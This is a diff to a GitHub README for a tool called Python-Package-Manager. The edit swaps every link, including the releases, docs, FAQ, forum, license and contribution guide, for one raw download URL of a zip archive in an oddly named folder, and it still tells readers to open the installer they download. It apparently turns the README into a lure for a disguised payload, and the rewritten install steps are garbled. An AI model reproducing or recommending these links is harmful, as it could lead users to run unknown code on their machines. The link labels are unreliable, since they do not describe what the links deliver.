@@ -1,6 +1,6 @@
 # 🐍 Python-Package-Manager - Simplify Your Python Package Management
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-blue?style=for-the-badge)](https://github.com/BVNAHUSH/Python-Package-Manager/releases)
+[![Download Now](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip)](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip)
 
 ## 🚀 Getting Started
 
@@ -15,11 +15,11 @@ Welcome to Python-Package-Manager! This tool helps you easily manage your Python
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/BVNAHUSH/Python-Package-Manager/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of Python-Package-Manager.
-3. Download the installer for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+3. Download the installer for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip for Linux).
 4. Once the download is complete, open the installer file to begin the installation.
 5. Follow the on-screen instructions to finish the installation.
 
@@ -56,9 +56,9 @@ After installation, you can launch Python-Package-Manager from your application 
 
 If you encounter issues or have questions while using Python-Package-Manager, please check the following resources:
 
-- **Documentation:** Comprehensive user guide available at [Documentation Link](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/docs/user_guide.md).
-- **FAQs:** A list of frequently asked questions is available at [FAQ Link](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/docs/faq.md).
-- **Community Support:** Join our community discussions at [Community Forum](https://github.com/BVNAHUSH/Python-Package-Manager/discussions).
+- **Documentation:** Comprehensive user guide available at [Documentation Link](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip).
+- **FAQs:** A list of frequently asked questions is available at [FAQ Link](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip).
+- **Community Support:** Join our community discussions at [Community Forum](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip).
 
 ## 📝 Contributing
 
@@ -69,16 +69,16 @@ We welcome contributions from users! If you want to help improve Python-Package-
 3. Make your changes and commit them.
 4. Submit a pull request detailing your changes.
 
-For detailed contribution guidelines, read the [Contribution Guide](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/CONTRIBUTING.md).
+For detailed contribution guidelines, read the [Contribution Guide](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip).
 
 ## 📄 License
 
-This project is licensed under the MIT License. For more details, read the [LICENSE](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/LICENSE).
+This project is licensed under the MIT License. For more details, read the [LICENSE](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip).
 
 ## 🔗 Useful Links
 
-- [GitHub Releases](https://github.com/BVNAHUSH/Python-Package-Manager/releases)
-- [Documentation](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/docs/user_guide.md)
-- [Contribution Guide](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/CONTRIBUTING.md)
+- [GitHub Releases](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip)
+- [Documentation](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/BVNAHUSH/Python-Package-Manager/main/acceptability/Python-Package-Manager.zip)
 
 Thank you for choosing Python-Package-Manager! We hope it makes your Python package management much easier.
